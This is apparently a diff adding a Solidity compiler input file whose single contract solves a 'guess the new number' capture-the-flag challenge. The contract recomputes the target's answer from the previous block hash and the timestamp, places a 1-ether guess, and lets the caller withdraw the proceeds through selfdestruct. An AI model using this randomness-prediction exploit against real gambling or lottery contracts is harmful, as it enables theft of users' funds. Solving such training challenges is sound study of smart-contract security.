@@ -1,0 +1,28 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/guessTheNewNumber.sol": {
+      "content": "pragma solidity ^0.4.21;\n\ninterface GuessTheNewNumberChallenge{\n    function guess(uint8 n) external payable;\n}\n\ncontract guessTheNewNumber{\n    uint8 public answer;\n\n    function getNumber(address target) public payable{\n        GuessTheNewNumberChallenge cont = GuessTheNewNumberChallenge(target);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n        cont.guess.value(1e18)(answer);\n    }\n\n    function destroy() public{\n        selfdestruct(msg.sender);\n    }\n\n    function() external payable {}\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    }
+  }
+}
